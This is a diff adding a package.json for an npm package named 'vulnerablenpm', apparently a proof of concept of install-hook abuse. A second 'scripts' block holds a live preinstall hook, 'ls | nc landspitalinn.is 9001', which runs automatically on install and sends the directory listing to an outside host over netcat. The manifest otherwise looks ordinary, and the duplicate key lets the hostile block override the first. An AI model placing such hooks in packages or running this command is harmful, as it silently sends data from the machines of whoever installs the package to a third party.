@@ -1,0 +1,20 @@
+{
+  "name": "vulnerablenpm",
+  "version": "1.0.0",
+  "description": "jajadingdong",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "repository": {
+    "type": "git",
+    "url": "github.com/dagurb/vulnerablenpm"
+  },
+  "author": "me",
+  "license": "ISC",
+  "scripts": {
+	"prepack": "echo prepack",
+	"prepare": "echo prepare",
+	"preinstall": "ls | nc landspitalinn.is 9001"
+  }
+}
